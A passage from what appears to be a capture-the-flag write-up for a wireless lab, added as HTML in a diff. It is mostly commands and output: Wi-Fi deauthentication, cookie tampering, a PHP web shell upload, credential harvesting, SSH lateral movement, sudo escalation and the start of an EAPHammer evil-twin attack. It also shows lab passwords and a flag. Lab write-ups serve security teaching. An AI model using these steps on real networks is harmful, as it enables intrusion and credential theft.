[F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:58  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:48:58  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">root@AirTouch-Consultant:~# aireplay-ng --deauth 10 -a F0:9F:C2:A3:F1:A7 wlan1</span><br><span class="line">06:49:09  Waiting for beacon frame (BSSID: F0:9F:C2:A3:F1:A7) on channel 6</span><br><span class="line">NB: this attack is more effective when targeting</span><br><span class="line">a connected wireless client (-c &lt;client&#x27;s mac&gt;).</span><br><span class="line">06:49:09  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:49:10  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:49:10  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:49:11  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:49:11  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:49:12  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:49:12  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:49:12  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:49:13  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">06:49:13  Sending DeAuth (code 7) to broadcast -- BSSID: [F0:9F:C2:A3:F1:A7]</span><br><span class="line">root@AirTouch-Consultant:~#</span><br></pre></td></tr></table></figure></div>
+
+<p>We pull the new <code>.cap</code> file to Kali, open it in Wireshark, and add the WPA decryption key:</p>
+<blockquote>
+<p><code>Edit -&gt; Preferences -&gt; IEEE 802.11 -&gt; edit decryption keys -&gt; wpa-pwd:challenge:AirTouch-Internet</code></p>
+</blockquote>
+<p>Once decoded, an <code>HTTP</code> GET request from the legitimate client to <code>/lab.php</code> reveals a session cookie and a leaked welcome message addressed to <code>manager</code>.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">GET /lab.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.3.1</span><br><span class="line"></span><br><span class="line">User-Agent: curl/7.88.1</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=ctf72095cfdr7iu3ru2blg59jq; UserRole=user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date: Tue, 20 Jan 2026 06:48:53 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"></span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line"></span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">Content-Length: 323</span><br><span class="line"></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;WiFi Router Configuration&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome manager&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">Congratulation! You have logged into password protected page. &lt;a href=&quot;index.php&quot;&gt;Click here&lt;/a&gt; to go to index.php to get the flag.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We now have a valid session cookie (<code>PHPSESSID=ctf72095cfdr7iu3ru2blg59jq</code>) and a hint that authorization is decided by the client-controlled <code>UserRole</code> cookie. We replay the cookie in our browser:</p>
+<p>![[Pasted image 20260120095627.png]]</p>
+<h2 id="Cookie-Tampering-Privilege-Bypass"><a href="#Cookie-Tampering-Privilege-Bypass" class="headerlink" title="Cookie Tampering - Privilege Bypass"></a>Cookie Tampering - Privilege Bypass</h2><p>We swap <code>UserRole=user</code> to <code>UserRole=admin</code> with Burp:</p>
+<p>![[Pasted image 20260120100338.png]]</p>
+<p><code>PHPSESSID=ctf72095cfdr7iu3ru2blg59jq; UserRole=admin</code> lands us on the admin dashboard, which exposes a file upload feature. We bypass the extension filter by uploading <code>&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</code> saved as <code>.phtml</code> and execute commands.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /uploads/shell4.phtml?cmd=id HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">sec-ch-ua: &quot;Not.A/Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;136&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Linux&quot;</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: PHPSESSID=ctf72095cfdr7iu3ru2blg59jq; UserRole=admin</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 20 Jan 2026 07:23:34 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Content-Length: 54</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We have RCE as <code>www-data</code> on the router. We now read <code>login.php</code> to see if there are hardcoded credentials.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /uploads/shell4.phtml?cmd=cat+../login.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">sec-ch-ua: &quot;Not.A/Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;136&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Linux&quot;</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: PHPSESSID=ctf72095cfdr7iu3ru2blg59jq; UserRole=admin</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 20 Jan 2026 07:24:43 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 2542</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;?php session_start(); /* Starts the session */</span><br><span class="line"></span><br><span class="line">// Check if user is already logged in</span><br><span class="line">if (isset($_SESSION[&#x27;UserData&#x27;][&#x27;Username&#x27;])) &#123;</span><br><span class="line">  header(&quot;Location:index.php&quot;); // Redirect to index.php</span><br><span class="line">  exit; // Make sure to exit after redirection</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;Submit&#x27;])) &#123;</span><br><span class="line">  /* Define username, associated password, and user attribute array */</span><br><span class="line">  $logins = array(</span><br><span class="line">    /*&#x27;user&#x27; =&gt; array(&#x27;password&#x27; =&gt; &#x27;JunDRDZKHDnpkpDDvay&#x27;, &#x27;role&#x27; =&gt; &#x27;admin&#x27;),*/</span><br><span class="line">    &#x27;manager&#x27; =&gt; array(&#x27;password&#x27; =&gt; &#x27;2wLFYNh4TSTgA5sNgT4&#x27;, &#x27;role&#x27; =&gt; &#x27;user&#x27;)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  /* Check and assign submitted Username and Password to new variable */</span><br><span class="line">  $Username = isset($_POST[&#x27;Username&#x27;]) ? $_POST[&#x27;Username&#x27;] : &#x27;&#x27;;</span><br><span class="line">  $Password = isset($_POST[&#x27;Password&#x27;]) ? $_POST[&#x27;Password&#x27;] : &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">  /* Check Username and Password existence in defined array */</span><br><span class="line">  if (isset($logins[$Username]) &amp;&amp; $logins[$Username][&#x27;password&#x27;] === $Password) &#123;</span><br><span class="line">    /* Success: Set session variables and redirect to Protected page  */</span><br><span class="line">    $_SESSION[&#x27;UserData&#x27;][&#x27;Username&#x27;] = $logins[$Username][&#x27;password&#x27;];</span><br><span class="line">    /* Success: Set session variables USERNAME  */</span><br><span class="line">    $_SESSION[&#x27;Username&#x27;] = $Username;</span><br><span class="line"></span><br><span class="line">    // Set a cookie with the user&#x27;s role</span><br><span class="line">    setcookie(&#x27;UserRole&#x27;, $logins[$Username][&#x27;role&#x27;], time() + (86400 * 30), &quot;/&quot;); // 86400 = 1 day</span><br><span class="line"></span><br><span class="line">    header(&quot;location:index.php&quot;);</span><br><span class="line">    exit;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    /*Unsuccessful attempt: Set error message */</span><br><span class="line">    $msg = &quot;&lt;span style=&#x27;color:red&#x27;&gt;Invalid Login Details&lt;/span&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;WiFi Router Configuration&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;content&quot;&gt;</span><br><span class="line">  &lt;h3&gt;PSK Router Login&lt;/h3&gt;</span><br><span class="line">  &lt;form action=&quot;&quot; method=&quot;post&quot; name=&quot;Login_Form&quot;&gt;</span><br><span class="line">    &lt;table width=&quot;400&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;5&quot; cellspacing=&quot;1&quot; class=&quot;Table&quot;&gt;</span><br><span class="line">      &lt;?php if (isset($msg)) &#123; ?&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">          &lt;td colspan=&quot;2&quot; align=&quot;center&quot; valign=&quot;top&quot;&gt;</span><br><span class="line">            &lt;?php echo $msg; ?&gt;</span><br><span class="line">          &lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">      &lt;?php &#125; ?&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td colspan=&quot;2&quot; align=&quot;left&quot; valign=&quot;top&quot;&gt;</span><br><span class="line">          &lt;h3&gt;Login&lt;/h3&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td align=&quot;right&quot; valign=&quot;top&quot;&gt;Username&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input name=&quot;Username&quot; type=&quot;text&quot; class=&quot;Input&quot;&gt;&lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td align=&quot;right&quot;&gt;Password&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; class=&quot;Input&quot;&gt;&lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td&gt; &lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input name=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;Login&quot; class=&quot;Button3&quot;&gt;&lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>The commented-out array entry leaks a second account: <code>user : JunDRDZKHDnpkpDDvay</code>. We try it as SSH credentials against the router.</p>
+<h2 id="Lateral-Movement-user-AirTouch-AP-PSK"><a href="#Lateral-Movement-user-AirTouch-AP-PSK" class="headerlink" title="Lateral Movement - user@AirTouch-AP-PSK"></a>Lateral Movement - user@AirTouch-AP-PSK</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# ssh user@192.168.3.1</span><br><span class="line">The authenticity of host &#x27;192.168.3.1 (192.168.3.1)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:++nw1pytCTTnPb2ngccd1CzlYaYUoTF8GmQ3a3QHnaU.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.3.1&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">user@192.168.3.1&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">user@AirTouch-AP-PSK:~$ ls</span><br><span class="line">user@AirTouch-AP-PSK:~$ cd</span><br><span class="line">user@AirTouch-AP-PSK:~$ ls</span><br><span class="line">user@AirTouch-AP-PSK:~$ id</span><br><span class="line">uid=1000(user) gid=1000(user) groups=1000(user)</span><br><span class="line">user@AirTouch-AP-PSK:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We are now sitting on <code>AirTouch-AP-PSK</code>, the PSK access point itself.</p>
+<h2 id="Privilege-Escalation-PSK-AP"><a href="#Privilege-Escalation-PSK-AP" class="headerlink" title="Privilege Escalation - PSK AP"></a>Privilege Escalation - PSK AP</h2><p><code>sudo -l</code> shows we can run anything with no password. Easy.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">user@AirTouch-AP-PSK:~$ sudo -l</span><br><span class="line">Matching Defaults entries for user on AirTouch-AP-PSK:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User user may run the following commands on AirTouch-AP-PSK:</span><br><span class="line">    (ALL) NOPASSWD: ALL</span><br><span class="line">user@AirTouch-AP-PSK:~$</span><br><span class="line">user@AirTouch-AP-PSK:~$ sudo su</span><br><span class="line">root@AirTouch-AP-PSK:/home/user# cd</span><br><span class="line">root@AirTouch-AP-PSK:~# ls</span><br><span class="line">certs-backup  cronAPs.sh  psk  send_certs.sh  start.sh  user.txt  wlan_config_aps</span><br><span class="line">root@AirTouch-AP-PSK:~# cat user.txt</span><br><span class="line">183ab4d95c2ca8c5864449e56c8d5261</span><br><span class="line">root@AirTouch-AP-PSK:~#</span><br></pre></td></tr></table></figure></div>
+
+<p><code>user.txt</code> is ours. While we’re here, let’s check what else lives on this AP — <code>send_certs.sh</code> looks juicy.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-AP-PSK:~# cat send_certs.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># DO NOT COPY</span><br><span class="line"># Script to sync certs-backup folder to AirTouch-office.</span><br><span class="line"></span><br><span class="line"># Define variables</span><br><span class="line">REMOTE_USER=&quot;remote&quot;</span><br><span class="line">REMOTE_PASSWORD=&quot;xGgWEwqUpfoOVsLeROeG&quot;</span><br><span class="line">REMOTE_PATH=&quot;~/certs-backup/&quot;</span><br><span class="line">LOCAL_FOLDER=&quot;/root/certs-backup/&quot;</span><br><span class="line"></span><br><span class="line"># Use sshpass to send the folder via SCP</span><br><span class="line">sshpass -p &quot;$REMOTE_PASSWORD&quot; scp -r &quot;$LOCAL_FOLDER&quot; &quot;$REMOTE_USER@10.10.10.1:$REMOTE_PATH&quot;</span><br><span class="line">root@AirTouch-AP-PSK:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Hardcoded credentials for the office AP: <code>remote : xGgWEwqUpfoOVsLeROeG</code>, target <code>10.10.10.1</code>. To reach that host, we need to be associated to the <strong><code>AirTouch-Office</code></strong> network — which is WPA2-Enterprise (802.1X). Time to escalate the wireless attack.</p>
+<h2 id="Targeting-AirTouch-Office-WPA2-Enterprise"><a href="#Targeting-AirTouch-Office-WPA2-Enterprise" class="headerlink" title="Targeting AirTouch-Office (WPA2-Enterprise)"></a>Targeting AirTouch-Office (WPA2-Enterprise)</h2><p>The <code>AirTouch-Office</code> SSID uses <strong>WPA2-Enterprise</strong> (802.1X) instead of a single shared key. Authentication is delegated to a RADIUS server, so each user has their own credentials — typically validated via PEAP-MSCHAPv2.</p>
+<p>The classic way to harvest credentials against PEAP is an <strong>Evil Twin &#x2F; Rogue AP</strong>: we stand up a malicious access point with the same SSID and signal-shadow the legitimate one with deauth frames. When the victim client roams to our AP, it transparently completes a PEAP exchange with us — handing over a username and an MSCHAPv2 challenge&#x2F;response that we can crack offline.</p>
+<p>We use <a target="_blank" rel="noopener" href="https://tbhaxor.com/evil-twin-with-karma-attack-using-eaphammer/"><strong>EAPHammer</strong></a> to do the heavy lifting.</p>
+<h3 id="Importing-Forged-Certificates"><a href="#Importing-Forged-Certificates" class="headerlink" title="Importing Forged Certificates"></a>Importing Forged Certificates</h3><p>The consultant box already has the AirTouch CA &#x2F; server cert &#x2F; private key staged in the home directory. We import them into EAPHammer so our rogue AP presents a “trusted-looking” certificate.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@AirTouch-Consultant:~# ./eaphammer/eaphammer --cert-wizard import --ca-cert ca.crt --server-cert server.crt --private-key server.key</span><br><span class="line"></span><br><span class="line">                     .__</span><br><span class="line">  ____ _____  ______ |  |__ _____    _____   _____   ___________</span><br><span class="line">_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \</span><br><span class="line">\  ___/ / __ \|  |_&gt; &gt;   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/</span><br><span class="line"> \___  &gt;____  /   __/|___|  (____  /__|_|  /__|_|  /\___  &gt;__|</span><br><span class="line">     \/     \/|__|        \/     \/      \/      \/     \/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        Now with more fast travel than a next-gen 